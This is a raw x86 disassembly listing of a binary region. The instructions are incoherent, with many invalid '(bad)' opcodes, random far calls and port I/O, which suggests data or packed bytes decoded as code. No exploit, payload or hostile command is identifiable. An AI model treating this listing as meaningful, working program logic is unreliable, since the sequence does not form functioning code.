  41d5dc:	add    BYTE PTR [ebp+0x69],al
  41d5df:	jb     0x41d60e
  41d5e1:	jo     0x41d622
  41d5e3:	cld    
  41d5e4:	pop    ebp
  41d5e5:	sbb    eax,0x860ddfdf
  41d5ea:	dec    edx
  41d5eb:	add    BYTE PTR [edx-0x34fa6add],0xa1
  41d5f2:	xchg   dx,ax
  41d5f4:	mov    bh,0xbb
  41d5f6:	push   ds
  41d5f7:	adc    dh,BYTE PTR [edi+0x4fc57968]
  41d5fd:	ror    DWORD PTR [ebp+0x59203ab5],cl
  41d603:	push   ebp
  41d604:	xor    dl,BYTE PTR [ecx-0x50]
  41d607:	ror    DWORD PTR [edi+0x50],cl
  41d60a:	imul   ebx,DWORD PTR [ecx],0xc98e0965
  41d610:	cmc    
  41d611:	adc    DWORD PTR [esi+0x32],ebp
  41d614:	scas   al,BYTE PTR es:[edi]
  41d615:	sbb    bl,BYTE PTR ds:0xf48c246d
  41d61b:	pop    ebx
  41d61c:	xchg   ebx,eax
  41d61d:	cdq    
  41d61e:	pop    es
  41d61f:	dec    ebp
  41d620:	pushf  
  41d621:	mov    esi,0xc13ee8e3
  41d626:	sar    DWORD PTR [esi-0x4ce8ff38],1
  41d62c:	leave  
  41d62d:	call   0xceebda55
  41d632:	mov    cl,0x50
  41d634:	and    BYTE PTR [esi+0x1f7b7315],cl
  41d63a:	pop    ebp
  41d63b:	and    DWORD PTR [esi-0x3cc88e6],ebx
  41d641:	test   DWORD PTR [esp+edi*8],0xd91e2dc0
  41d648:	outs   dx,BYTE PTR ds:[esi]
  41d649:	sbb    al,0x94
  41d64b:	push   esi
  41d64c:	xor    bl,BYTE PTR [esi]
  41d64e:	mov    ch,0xb6
  41d650:	es inc ebp
  41d652:	test   BYTE PTR [esi+0x3f],dh
  41d655:	xlat   BYTE PTR ds:[ebx]
  41d656:	xchg   DWORD PTR [esp+ebx*4-0x2deebd6b],edx
  41d65d:	sub    eax,0xc96338b
  41d662:	adc    dh,al
  41d664:	inc    edx
  41d665:	icebp  
  41d666:	mov    ebp,0x7d841770
  41d66b:	stc    
  41d66c:	mov    ds:0xff4deb5c,al
  41d671:	fsub   QWORD PTR [ebp-0x5b7937fc]
  41d677:	dec    ebp
  41d678:	push   esp
  41d679:	mov    edx,0xc20e888
  41d67e:	mov    ebp,0x1214dee6
  41d683:	dec    esp
  41d684:	dec    edi
  41d685:	call   0xc4080ad9
  41d68a:	xor    ch,bl
  41d68c:	push   es
  41d68d:	push   edx
  41d68e:	pop    eax
  41d68f:	fcmovnu st,st(0)
  41d691:	sbb    DWORD PTR [ebx+0x51],eax
  41d694:	sbb    BYTE PTR [edi-0x35],ah
  41d697:	dec    ecx
  41d698:	jno    0x41d6d7
  41d69a:	popf   
  41d69b:	fmul   QWORD PTR ds:0xaa3e96c8
  41d6a1:	(bad)  
  41d6a2:	and    al,BYTE PTR [edi-0x4]
  41d6a5:	xchg   esp,eax
  41d6a6:	lahf   
  41d6a7:	and    al,0x23
  41d6a9:	sub    eax,0xee9ea9fd
  41d6ae:	out    dx,al
  41d6af:	jmp    0x41d685
  41d6b1:	shl    ebp,1
  41d6b3:	test   bh,ah
  41d6b5:	jp     0x41d6d9
  41d6b7:	sub    al,0x52
  41d6b9:	dec    esi
  41d6ba:	rcl    DWORD PTR [eax-0x7f],1
  41d6bd:	mov    eax,0xeb1800f1
  41d6c2:	pushf  
  41d6c3:	mov    ebp,0x96be09bf
  41d6c8:	iret   
  41d6c9:	mov    al,ds:0xb437333f
  41d6ce:	gs cs dec edi
  41d6d1:	clc    
  41d6d2:	push   esi
  41d6d3:	push   esp
  41d6d4:	leave  
  41d6d5:	daa    
  41d6d6:	jb     0x41d6b6
  41d6d8:	ins    BYTE PTR es:[edi],dx
  41d6d9:	int    0x18
  41d6db:	loopne 0x41d67f
  41d6dd:	data16 (bad) 
  41d6e0:	pop    edi
  41d6e1:	mov    dh,0x79
  41d6e3:	or     al,BYTE PTR [eax]
  41d6e5:	fmul   DWORD PTR [edi+0x22]
  41d6e8:	jno    0x41d749
  41d6ea:	retf   
  41d6eb:	push   0xffffff89
  41d6ed:	jbe    0x41d715
  41d6ef:	out    dx,al
  41d6f0:	les    ebp,FWORD PTR ds:[ecx+esi*8]
  41d6f4:	ret    
  41d6f5:	pop    ds
  41d6f6:	pop    edx
  41d6f7:	call   0xcae0d736
  41d6fc:	clc    
  41d6fd:	inc    ebx
  41d6fe:	test   DWORD PTR [ecx],edi
  41d700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d701:	pop    ebx
  41d702:	jp     0x41d75d
  41d704:	push   cs
  41d705:	lock jl 0x41d68d
  41d708:	push   ds
  41d709:	xor    al,0xc7
  41d70b:	sbb    eax,0x18eceec2
  41d710:	xchg   esi,eax
  41d711:	stos   BYTE PTR es:[edi],al
  41d712:	push   ecx
  41d713:	into   
  41d714:	in     eax,0x52
  41d716:	fild   WORD PTR [edi-0x16c9bce7]
  41d71c:	scas   eax,DWORD PTR es:[edi]
  41d71d:	sub    eax,0x758942a9
  41d722:	sbb    al,0x4
  41d724:	mov    ebx,0xccdf6ffe
  41d729:	add    al,0xf3
  41d72b:	xchg   esi,eax
  41d72c:	int    0x31
  41d72e:	jmp    0x41d748
  41d730:	stos   DWORD PTR es:[edi],eax
  41d731:	mov    al,0xd6
  41d733:	jbe    0x41d6b5
  41d735:	xchg   edi,eax
  41d736:	xor    esp,DWORD PTR [ebx-0x8635771]
  41d73c:	not    BYTE PTR [ebx+0x68c356f8]
  41d742:	adc    al,0x7e
  41d744:	mov    bl,0xf6
  41d746:	mov    ecx,0xd24a7cae
  41d74b:	loop   0x41d73e
  41d74d:	sub    eax,0x21490499
  41d752:	inc    ebp
  41d753:	adc    al,0xb8
  41d755:	or     edi,DWORD PTR [edx+0x72]
  41d758:	(bad)  
  41d759:	xchg   ecx,eax
  41d75a:	add    al,0xdd
  41d75c:	fs mov ebx,esp
  41d75f:	jae    0x41d6eb
  41d761:	retf   0x2516
  41d764:	sub    DWORD PTR [ebp+0xe],0x49045077
  41d76b:	scas   al,BYTE PTR es:[edi]
  41d76c:	lods   al,BYTE PTR ds:[esi]
  41d76d:	dec    ecx
  41d76e:	xor    DWORD PTR [ebx],0xffffffb1
  41d771:	push   cs
  41d772:	and    cl,BYTE PTR [ebx+0x0]
  41d775:	shl    al,cl
  41d777:	add    edx,DWORD PTR [ebx]
  41d779:	push   ebx
  41d77a:	or     al,0x34
  41d77c:	pop    ecx
  41d77d:	jp     0x41d7fc
  41d77f:	adc    cl,0x3
  41d782:	std    
  41d783:	sbb    DWORD PTR [esp+ebx*4-0x51111ee4],edi
  41d78a:	mov    cl,0xcd
  41d78c:	dec    ebx
  41d78d:	add    DWORD PTR [ebp-0x46],0xf71c5821
  41d794:	lea    ecx,[eax]
  41d796:	sti    
  41d797:	ins    DWORD PTR es:[edi],dx
  41d798:	lods   al,BYTE PTR ds:[esi]
  41d799:	mov    DWORD PTR [edx-0x5b],0x3de1e867
  41d7a0:	pop    ds
  41d7a1:	ja     0x41d7f5
  41d7a3:	out    dx,al
  41d7a4:	test   al,0x58
  41d7a6:	xchg   ebp,eax
  41d7a7:	add    eax,0x38342a9e
  41d7ac:	push   esi
  41d7ad:	cmp    bl,BYTE PTR [eax-0x52c0447]
  41d7b3:	fisub  WORD PTR [esi+0x3f]
  41d7b6:	pop    ebp
  41d7b7:	mov    esp,0x7f9c3194
  41d7bc:	jbe    0x41d804
  41d7be:	pop    ebx
  41d7bf:	in     al,dx
  41d7c0:	stos   DWORD PTR es:[edi],eax
  41d7c1:	add    BYTE PTR [ebp+0x2e],bh
  41d7c4:	cmp    eax,0xcd4b63a6
  41d7c9:	fwait
  41d7ca:	retf   
  41d7cb:	mov    WORD PTR [edx+ecx*4-0x76],es
  41d7cf:	dec    ebp
  41d7d0:	add    DWORD PTR [eax-0x32],0x46
  41d7d4:	outs   dx,DWORD PTR ds:[esi]
  41d7d6:	mov    al,ds:0x882b5843
  41d7db:	xor    ebx,DWORD PTR [ecx-0x57]
  41d7de:	and    al,BYTE PTR [ecx+0x67f775d4]
  41d7e4:	ror    DWORD PTR [eax-0x7fd9495f],cl
  41d7ea:	das    
  41d7eb:	fimul  DWORD PTR [eax+0x75]
  41d7ee:	mov    BYTE PTR [edi],ch
  41d7f0:	icebp  
  41d7f1:	adc    bl,bl
  41d7f3:	scas   al,BYTE PTR es:[edi]
  41d7f4:	lods   al,BYTE PTR ds:[esi]
  41d7f5:	stos   BYTE PTR es:[edi],al
  41d7f6:	jne    0x41d7b2
  41d7f8:	xchg   DWORD PTR [eax-0x15],eax
  41d7fb:	or     ah,BYTE PTR [ebx]
  41d7fd:	pop    ds
  41d7fe:	data16 mov BYTE PTR [edx-0x3d],ch
  41d802:	(bad)  
  41d803:	in     eax,0x31
  41d805:	popf   
  41d806:	jge    0x41d87e
  41d808:	mov    esp,0xa0b02e62
  41d80d:	push   edx
  41d80e:	adc    bh,BYTE PTR [edx-0x5643edb5]
  41d814:	jl     0x41d84b
  41d816:	cmc    
  41d817:	xchg   edx,eax
  41d818:	inc    ebx
  41d819:	push   esi
  41d81a:	sbb    eax,0x955b5feb
  41d81f:	add    ch,BYTE PTR [esi+0x1c40f15f]
  41d825:	add    DWORD PTR [edi+0x36],ecx
  41d828:	aad    0x6e
  41d82a:	(bad)  
  41d82b:	aas    
  41d82c:	dec    ebp
  41d82d:	pop    ss
  41d82e:	ud1    esi,esi
  41d831:	push   eax
  41d832:	scas   eax,DWORD PTR es:[edi]
  41d833:	enter  0x6764,0xa7
  41d837:	adc    dl,bh
  41d839:	or     BYTE PTR [edi],dl
  41d83b:	push   ds
  41d83c:	cmp    BYTE PTR [edi-0x14],ch
  41d83f:	xor    al,0x6
  41d841:	mov    ebx,fs
  41d843:	xchg   esi,eax
  41d844:	dec    edx
  41d845:	test   al,0x9c
  41d847:	mov    ch,0xe8
  41d849:	shr    BYTE PTR [ecx],cl
  41d84b:	xchg   DWORD PTR [eax+0x13e30c81],edi
  41d851:	and    al,0x82
  41d853:	push   ebx
  41d854:	push   esp
  41d855:	std    
  41d856:	jae    0x41d864
  41d858:	dec    ecx
  41d859:	or     esi,ebp
  41d85b:	add    DWORD PTR [esp+edi*4+0x11299ea0],ebx
  41d862:	mov    dl,0xda
  41d864:	ds mov ecx,0xaf8ece92
  41d86a:	sbb    BYTE PTR ds:[ecx],dh
  41d86d:	pop    es
  41d86e:	stc    
  41d86f:	mov    ?,WORD PTR [edi-0x39f6a302]
  41d875:	push   ebx
  41d876:	ins    DWORD PTR es:[edi],dx
  41d877:	push   0xffffffb5
  41d879:	mov    esp,0xaa1095d5
  41d87e:	fucomi st,st(7)
  41d880:	ret    
  41d881:	xchg   ecx,eax
  41d882:	pop    edi
  41d883:	fnsetpm(287 only) 
  41d885:	popf   
  41d886:	data16 aas 
  41d888:	mov    ds:0xa759e5aa,eax
  41d88d:	jge    0x41d884
  41d88f:	out    0x5f,eax
  41d891:	sbb    dl,bh
  41d893:	scas   eax,DWORD PTR es:[edi]
  41d894:	lock pop ebx
  41d896:	(bad)  
  41d897:	mov    esp,0x87d605d
  41d89c:	test   DWORD PTR [edi-0x764006f3],0xe93ff86e
  41d8a6:	mov    cl,0xa8
  41d8a8:	mov    cl,0x2a
  41d8aa:	lods   eax,DWORD PTR ds:[esi]
  41d8ab:	(bad)  
  41d8ac:	or     al,0xd4
  41d8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8af:	test   BYTE PTR [ebx+ecx*1-0x6b0d0069],bh
  41d8b6:	sbb    al,0xae
  41d8b8:	imul   edi,DWORD PTR [edi],0xffffffce
  41d8bb:	and    edi,DWORD PTR [ebp+0x332791c0]
  41d8c1:	outs   dx,DWORD PTR fs:[esi]
  41d8c3:	icebp  
  41d8c4:	jae    0x41d911
  41d8c6:	lock fild DWORD PTR ds:0xf831631b
  41d8cd:	and    DWORD PTR gs:[edx+edi*1+0x6f],ebx
  41d8d2:	push   cs
  41d8d3:	cld    
  41d8d4:	inc    eax
  41d8d5:	pop    edx
  41d8d6:	sbb    al,0xe1
  41d8d8:	push   ebx
  41d8d9:	sub    ebp,DWORD PTR [eax]
  41d8db:	jle    0x41d8ba
  41d8dd:	scas   eax,DWORD PTR es:[edi]
  41d8de:	mov    DWORD PTR [eax+0x2d7ed994],esp
  41d8e4:	sbb    BYTE PTR [edx+0x45],al
  41d8e7:	add    cl,BYTE PTR [ecx-0x146999c]
  41d8ed:	cwde   
  41d8ee:	fs lock stos DWORD PTR es:[edi],eax
  41d8f1:	pop    ebx
  41d8f2:	inc    esp
  41d8f3:	lods   eax,DWORD PTR ds:[esi]
  41d8f4:	adc    ebp,DWORD PTR [esi+0x26d3b6c4]
  41d8fa:	inc    esi
  41d8fb:	sub    eax,0x6c823686
  41d900:	test   al,0x9b
  41d902:	fist   DWORD PTR [esi+0x2d95b1e]
  41d908:	mov    ah,0x73
  41d90a:	sbb    BYTE PTR [eax+0x5e],0x21
  41d90e:	or     ah,BYTE PTR [edi+0x493fe6f9]
  41d914:	mov    ah,0xa7
  41d916:	fwait
  41d917:	pop    edi
  41d918:	mov    ah,0xaa
  41d91a:	mov    al,ds:0x8469dd97
  41d91f:	arpl   bx,cx
  41d921:	call   0xaf78:0x624432d1
  41d928:	popa   
  41d929:	shl    DWORD PTR [esp+ebp*2-0x54],1
  41d92d:	aad    0x65
  41d92f:	mov    ss,WORD PTR [ebx+0x185d5fa0]
  41d935:	jmp    0xb5fc:0x768cc65f
  41d93c:	cmc    
  41d93d:	inc    ecx
  41d93e:	xor    BYTE PTR [eax-0xbdc984b],bh
  41d944:	call   0x21c30baa
  41d949:	dec    edx
  41d94a:	add    esp,DWORD PTR [edi+0x19f9b76e]
  41d950:	inc    eax
  41d951:	push   ds
  41d952:	jmp    0x469f:0xa7f7c083
  41d959:	adc    DWORD PTR [edx+0x3a03dae5],edi
  41d95f:	jge    0x41d9b4
  41d961:	shr    DWORD PTR [edx+0x77],1
  41d964:	sbb    al,BYTE PTR [edi+0x7d]
  41d967:	mov    dh,BYTE PTR [edi]
  41d969:	xor    al,0xbd
  41d96b:	cmc    
  41d96c:	fdiv   DWORD PTR [edi-0x4d]
  41d96f:	stos   DWORD PTR es:[edi],eax
  41d970:	call   0x41f7fbc0
  41d975:	add    dl,BYTE PTR [eax-0x25]
  41d978:	icebp  
  41d979:	add    BYTE PTR [edx],ah
  41d97b:	push   ecx
  41d97c:	or     al,0xb3
  41d97e:	mov    esp,0x5a020a5a
  41d983:	sub    al,dh
  41d985:	and    eax,0x6af46cbb
  41d98a:	(bad)  
  41d98b:	retf   
  41d98c:	fsubr  DWORD PTR [ecx+0x6d]
  41d98f:	or     ah,cl
  41d991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d992:	imul   ecx,DWORD PTR [edx-0x18350f0b],0xffffffc8
  41d999:	imul   eax,DWORD PTR [ebx],0x4229ecb3
  41d99f:	nop
  41d9a0:	sbb    BYTE PTR [eax],dl
  41d9a2:	pop    DWORD PTR [eax]
  41d9a4:	jmp    ecx
  41d9a6:	sub    DWORD PTR [esi],esp
  41d9a8:	sti    
  41d9a9:	sbb    DWORD PTR [ebx],eax
  41d9ab:	jle    0x41d92f
  41d9ad:	pop    ss
  41d9ae:	imul   ebx,DWORD PTR [edx],0xffffff87
  41d9b1:	cmp    eax,0x2f11680f
  41d9b6:	sub    BYTE PTR [esi],ah
  41d9b8:	sbb    eax,0xb7f22d4a
  41d9bd:	stos   BYTE PTR es:[edi],al
  41d9be:	add    esp,ebp
  41d9c0:	mov    ch,0xc9
  41d9c2:	sbb    DWORD PTR cs:[ebx+ebx*8-0x7d],0xbe11747f
  41d9cb:	lock scas ax,WORD PTR es:[edi]
  41d9ce:	lahf   
  41d9cf:	mov    ebp,0xb5f16c60
  41d9d4:	call   0x4a5:0x2883e638
  41d9db:	aaa    
  41d9dc:	inc    esi
  41d9dd:	in     eax,0x83
  41d9df:	loopne 0x41d99a
  41d9e1:	cmp    BYTE PTR [edi+edx*2+0x76],ah
  41d9e5:	not    edi
  41d9e7:	or     dh,BYTE PTR [ecx]
  41d9e9:	test   eax,0x65cd1005
  41d9ee:	jle    0x41da0f
  41d9f0:	or     eax,0x6f44947
  41d9f5:	enter  0xecc8,0x9c
  41d9f9:	pop    esi
  41d9fa:	(bad)  
  41d9fb:	test   al,0x9a
  41d9fd:	xchg   ecx,eax
  41d9fe:	add    eax,0xecba027f
  41da03:	jmp    0x5131:0xc19d1245
  41da0a:	jnp    0x41da3f
  41da0c:	shr    BYTE PTR [esi+0x1aaf72d1],0x4b
  41da13:	jae    0x41da4f
  41da15:	dec    ecx
  41da16:	adc    eax,0x7a26bb81
  41da1b:	jb     0x41da30
  41da1d:	loop   0x41da5a
  41da1f:	push   0xfba4ba2f
  41da24:	push   ebx
  41da25:	repnz fsave [esi-0x490d18dc]
  41da2d:	dec    esi
  41da2e:	jns    0x41d9b2
  41da30:	push   DWORD PTR [ecx+0x17929333]
  41da36:	mov    eax,ds:0x2d8dcd09
  41da3b:	test   DWORD PTR [edi],edx
  41da3d:	iret   
  41da3e:	cmp    DWORD PTR [edx+eiz*8+0xf83fc17],ebx
  41da45:	arpl   WORD PTR [edi+0x6e],bp
  41da48:	ss out dx,eax
  41da4a:	lds    esi,FWORD PTR [edx-0x474977c6]
  41da50:	rcl    DWORD PTR [ecx+0x45c860fa],0x43
  41da57:	(bad)  
  41da58:	(bad)  
  41da59:	test   eax,0xc194a831
  41da5e:	mov    eax,0x2554d737
  41da63:	jns    0x41dacc
  41da65:	ret    
  41da66:	mov    ch,0xa9
  41da68:	lock push 0x3c4d046a
  41da6e:	dec    esp
  41da6f:	mov    edx,eax
  41da71:	or     bh,BYTE PTR [ecx+0x24]
  41da74:	mov    ebp,0x58ee6c5a
  41da79:	popa   
  41da7a:	stc    
  41da7b:	push   cs
  41da7c:	sub    al,0x0
  41da7e:	rcr    BYTE PTR [edi-0x109ddd77],0xc4
  41da85:	loop   0x41db05
  41da87:	and    eax,0x6d367e23
  41da8c:	dec    ebx
  41da8d:	push   eax
  41da8e:	aad    0x2c
  41da90:	mov    DWORD PTR [ebx],esi
  41da92:	fidivr DWORD PTR [edx-0x55]
  41da95:	and    cl,BYTE PTR [edi-0x1e]
  41da98:	fcom   QWORD PTR [ebp-0x2dc61b1b]
  41da9e:	adc    BYTE PTR [ebx-0x463533be],ah
  41daa4:	out    0xf5,eax
  41daa6:	(bad)  
  41daa7:	dec    edi
  41daa8:	bound  esi,QWORD PTR [edi]
  41daaa:	xchg   DWORD PTR [edx-0x18],ebp
  41daad:	js     0x41da9e
  41daaf:	xlat   BYTE PTR ds:[ebx]
  41dab0:	outs   dx,DWORD PTR ds:[esi]
  41dab1:	inc    esp
  41dab2:	loope  0x41db15
  41dab4:	jecxz  0x41da59
  41dab6:	out    dx,eax
  41dab7:	mov    bl,0xba
  41dab9:	push   edi
  41daba:	mov    al,0xf7
  41dabc:	add    al,0xba
  41dabe:	and    BYTE PTR [eax-0x57],ah
  41dac1:	pop    esp
  41dac2:	mov    edi,0x774eb5d8
  41dac7:	inc    ebp
  41dac8:	loopne 0x41db2e
  41daca:	icebp  
  41dacb:	gs call 0x9bd5:0x57fcd3c3
  41dad3:	cmp    al,al
  41dad5:	mov    eax,DWORD PTR [ebx+0x3c074c15]
  41dadb:	mov    bh,0x76
  41dadd:	push   ebx
  41dade:	scas   al,BYTE PTR es:[edi]
  41dadf:	imul   edi,esi,0xffffffbb
  41dae2:	std    
  41dae3:	retf   0x3596
  41dae6:	push   edi
  41dae7:	repz test eax,0x10c05940
  41daed:	shl    BYTE PTR [ecx-0x19],0xd4
  41daf1:	and    DWORD PTR [edi],edx
  41daf3:	ja     0x41db31
  41daf5:	dec    esi
  41daf6:	xor    BYTE PTR [esi],0x6f
  41daf9:	ins    DWORD PTR es:[edi],dx
  41dafa:	jb     0x41db64
  41dafc:	fsub   QWORD PTR [ebp+0x62b7adfd]
  41db02:	xchg   ecx,eax
  41db03:	retf   0xdf2d
  41db06:	dec    edi
  41db07:	mov    WORD PTR [ebx+0x3664a748],?
  41db0d:	ss sub al,0x2e
  41db10:	push   cs
  41db11:	inc    ebp
  41db12:	pop    ds
  41db13:	scas   al,BYTE PTR es:[edi]
  41db14:	xchg   esp,eax
  41db15:	jmp    0x41db56
  41db17:	test   BYTE PTR [eax],ah
  41db19:	dec    ecx
  41db1a:	fs xor al,0x9b
  41db1d:	daa    
  41db1e:	xor    cl,BYTE PTR [esi-0x56d62e69]
  41db24:	mov    esi,0xf11937bf
  41db29:	sub    BYTE PTR [ebp+0x7bd70489],ah
  41db2f:	pop    edi
  41db30:	jmp    DWORD PTR [eax]
  41db32:	cdq    
  41db33:	mov    ds:0x64e79ded,eax
  41db38:	shr    al,0x91
  41db3b:	mov    dl,0xae
  41db3d:	xchg   esp,eax
  41db3e:	cmp    al,0xa7
  41db40:	jns    0x41db73
  41db42:	add    esp,DWORD PTR [esi]
  41db44:	jecxz  0x41db8b
  41db46:	mov    DWORD PTR [ebx],edx
  41db48:	and    BYTE PTR [edi-0x469296a7],0xe0
  41db4f:	mov    al,ds:0xdf6de23
  41db54:	cmp    eax,0xda0f84d7
  41db59:	mov    ecx,0xd97036b7
  41db5e:	mov    bh,ah
  41db60:	add    ecx,DWORD PTR [edx+0x66851e61]
  41db66:	or     al,0xa4
  41db68:	jnp    0x41db17
  41db6a:	xchg   edx,eax
  41db6b:	xchg   ecx,eax
  41db6c:	les    ebp,FWORD PTR [ecx+0x43efd4f4]
  41db72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db73:	jb     0x41dbd3
  41db75:	imul   BYTE PTR [edx+0x68]
  41db78:	inc    ecx
  41db79:	mov    ds:0x9e700241,al
  41db7e:	sub    DWORD PTR [esi],esi
  41db80:	ds jns 0x41db3f
  41db83:	sub    DWORD PTR [eax+ebx*1-0x29],ecx
  41db87:	jg     0x41db26
  41db89:	xor    edi,0xfffffff3
  41db8c:	into   
  41db8d:	stos   BYTE PTR es:[edi],al
  41db8e:	inc    esp
  41db8f:	cli    
  41db90:	adc    BYTE PTR [edx],0x2b
  41db93:	fcmovne st,st(6)
  41db95:	push   ebx
  41db96:	stos   WORD PTR es:[edi],ax
  41db98:	mov    ch,BYTE PTR [bx+si-0x7717]
  41db9d:	and    al,0x3e
  41db9f:	sahf   
  41dba0:	call   0xefb2:0x4eba6be
  41dba7:	mul    edi
  41dba9:	inc    eax
  41dbaa:	push   ss
  41dbab:	mov    bl,0x3c
  41dbad:	retf   
  41dbae:	out    dx,eax
  41dbaf:	icebp  
  41dbb0:	int3   
  41dbb1:	xchg   ebx,eax
  41dbb2:	dec    edi
  41dbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb4:	cwde   
  41dbb5:	xchg   ebx,eax
  41dbb6:	mov    ch,dh
  41dbb8:	jge    0x41db57
  41dbba:	jae    0x41db76
  41dbbc:	push   ebx
  41dbbd:	lods   al,BYTE PTR ds:[esi]
  41dbbe:	hlt    
  41dbbf:	cmp    ah,cl
  41dbc1:	pop    ds
  41dbc2:	(bad)
  41dbc5:	mov    eax,ds:0x7edac7a0
  41dbca:	mov    gs,WORD PTR [esi+esi*1+0x1963da82]
  41dbd1:	jns    0x41db97
  41dbd3:	push   es
  41dbd4:	sub    dh,ah
  41dbd6:	lahf   
  41dbd7:	and    BYTE PTR [ecx],bl
  41dbd9:	shl    esp,0x83
  41dbdc:	and    bh,dl
  41dbde:	out    0xf1,al
  41dbe0:	mov    bl,0x48
  41dbe2:	xor    eax,0xd2fe8df6
  41dbe7:	jbe    0x41dbf6
  41dbe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbeb:	icebp  
  41dbec:	mov    WORD PTR [ecx],ss
  41dbee:	out    dx,eax
  41dbef:	push   0x2131940
  41dbf4:	pop    ss
  41dbf5:	ficomp WORD PTR [ecx-0x3f2a24ba]
  41dbfb:	aas    
  41dbfc:	mov    dl,0x3c
  41dbfe:	in     eax,0x5b
  41dc00:	dec    eax
  41dc01:	mov    ebx,0x6073ec38
  41dc06:	pop    edi
  41dc07:	sbb    esp,0xffffffd8
  41dc0a:	mov    edx,0x4b0262d8
  41dc0f:	dec    esi
  41dc10:	out    0xe8,al
  41dc12:	or     DWORD PTR [eax],ebp
  41dc14:	fsubr  QWORD PTR cs:[ebp+0x61]
  41dc18:	(bad)  
  41dc19:	jg     0x41dc7e
  41dc1b:	xchg   DWORD PTR [eax+0x103d8c9f],ebp
  41dc21:	fst    DWORD PTR [edx]
  41dc23:	das    
  41dc24:	call   0xb45f:0xdcf37fa3
  41dc2b:	rcr    DWORD PTR [edi-0x33],1
  41dc2e:	ror    bl,1
  41dc30:	push   eax
  41dc31:	jg     0x41dbcf
  41dc33:	(bad)  
  41dc34:	out    dx,eax
  41dc35:	js     0x41dc12
  41dc37:	jmp    0x39db9e3c
  41dc3c:	lahf   
  41dc3d:	bound  ebp,QWORD PTR [ecx+0x32]
  41dc40:	jb     0x41dc5a
  41dc42:	adc    BYTE PTR [ebx-0x68],0x3f
  41dc46:	js     0x41dc9c
  41dc48:	sahf   
  41dc49:	ja     0x41dcaa
  41dc4b:	jge    0x41dbf9
  41dc4d:	jb     0x41dc48
  41dc4f:	mov    esp,0xf4bf9738
  41dc54:	adc    edx,ebp
  41dc56:	mov    cl,0xc9
  41dc58:	jg     0x41dc59
  41dc5a:	mov    ebp,0x4792840a
  41dc5f:	shl    ebx,0xbb
  41dc62:	loop   0x41dc47
  41dc64:	out    dx,eax
  41dc65:	nop
  41dc66:	cmc    
  41dc67:	(bad)  
  41dc69:	sbb    ebp,esp
  41dc6b:	imul   edx,DWORD PTR [esi+0x35],0x2e5c4876
  41dc72:	add    DWORD PTR [ebx+0x62],eax
  41dc75:	in     al,dx
  41dc76:	mov    ch,0x4b
  41dc78:	dec    esp
  41dc79:	xchg   al,al
  41dc7b:	loop   0x41dcd4
  41dc7d:	ins    BYTE PTR es:[edi],dx
  41dc7e:	push   cs
  41dc7f:	in     eax,0xc4
  41dc81:	mov    ecx,0xcf8479c4
  41dc86:	sar    BYTE PTR [edx+0x60],0x89
  41dc8a:	dec    esp
  41dc8b:	pop    edx
  41dc8c:	and    DWORD PTR [ecx-0x2358381e],edx
  41dc92:	xchg   edi,eax
  41dc93:	xchg   BYTE PTR [edi+0x26],ah
  41dc96:	push   esp
  41dc97:	test   esp,ebx
  41dc99:	dec    ebp
  41dc9a:	jnp    0x41dc7d
  41dc9c:	push   eax
  41dc9d:	mov    edx,ecx
  41dc9f:	cmp    al,0x5c
  41dca1:	ins    BYTE PTR es:[edi],dx
  41dca2:	int3   
  41dca3:	jnp    0x41dcd9
  41dca5:	and    dh,ch
  41dca7:	cs push ebx
  41dca9:	iret   
  41dcaa:	sbb    dl,ah
  41dcac:	adc    al,0xd3
  41dcae:	(bad)  
  41dcaf:	out    0xeb,al
  41dcb1:	sbb    DWORD PTR [edi+eiz*1],edx
  41dcb4:	repz sbb BYTE PTR [edi],bl
  41dcb7:	fadd   DWORD PTR ss:[eax+eax*2]
  41dcbb:	fadd   QWORD PTR [eax+edx*1]
  41dcbe:	pop    esi
  41dcbf:	xor    eax,DWORD PTR [eax-0x3c]
  41dcc2:	cdq    
  41dcc3:	int3   
  41dcc4:	mov    ah,0x1d
  41dcc6:	call   0xfb2e:0x531dbc46
  41dccd:	fs inc ebx
  41dccf:	xchg   ebp,eax
  41dcd0:	xor    ebx,DWORD PTR [eax]
  41dcd2:	(bad)  
  41dcd3:	sti    
  41dcd4:	xchg   ebx,eax
  41dcd5:	and    al,0x31
  41dcd8:	lods   al,BYTE PTR ds:[esi]
  41dcd9:	in     al,0x45
  41dcdb:	std    
  41dcdc:	cwde   
  41dcdd:	fnstsw WORD PTR [ebx]
  41dcdf:	push   eax
  41dce0:	retf   0x4159
  41dce3:	cmp    ecx,DWORD PTR ds:[eax+0x56]
  41dce7:	bndstx [edx-0xbc0f232],bnd0
  41dcee:	xchg   esp,eax
  41dcef:	pop    ebx
  41dcf0:	nop
  41dcf1:	and    eax,edi
  41dcf3:	jmp    0x3b4b:0x5b70230e
  41dcfa:	(bad)  
  41dcfb:	jp     0x41dca0
  41dcfd:	sbb    BYTE PTR [ebx],ch
  41dcff:	aam    0xf5
  41dd01:	fcom   QWORD PTR [ebp-0x2a68c9cd]
  41dd07:	xor    ebp,DWORD PTR [ecx+0xe]
  41dd0a:	(bad)  
  41dd0b:	jae    0x41dd5b
  41dd0d:	mov    bl,0x18
  41dd0f:	jb     0x41dcdc
  41dd11:	xor    bl,al
  41dd13:	inc    esi
  41dd14:	mov    DWORD PTR ss:[ecx-0x4b],ebp
  41dd18:	jecxz  0x41dd35
  41dd1a:	jg     0x41dc9e
  41dd1c:	outs   dx,BYTE PTR ds:[esi]
  41dd1d:	mov    cl,0x4
  41dd1f:	adc    ebx,eax
  41dd21:	loope  0x41dcc4
  41dd23:	adc    al,0x6
  41dd25:	jp     0x41dd31
  41dd27:	mov    ds:0xc8901f0c,al
  41dd2c:	mov    bh,0xd1
  41dd2e:	loopne 0x41dd21
  41dd30:	sub    al,0x22
  41dd32:	lahf   
  41dd33:	add    ah,BYTE PTR [esi-0x42]
  41dd36:	cld    
  41dd37:	add    bh,bl
  41dd39:	hlt    
  41dd3a:	jmp    0x35ee0818
  41dd3f:	ficom  WORD PTR [esi-0x78]
  41dd42:	jmp    0x41dd0b
  41dd44:	dec    esp
  41dd45:	jecxz  0x41dd53
  41dd47:	or     DWORD PTR [edx+0x7e2e7afa],eax
